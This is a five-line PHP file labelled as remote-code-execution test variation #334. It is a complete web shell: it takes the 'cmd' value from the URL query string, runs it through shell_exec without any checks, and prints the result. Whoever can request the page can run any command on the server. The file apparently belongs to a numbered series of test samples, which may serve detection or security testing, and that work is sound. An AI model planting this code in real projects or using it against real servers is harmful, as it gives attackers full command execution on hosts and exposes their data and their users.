<?php
// RCE test variation #334
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>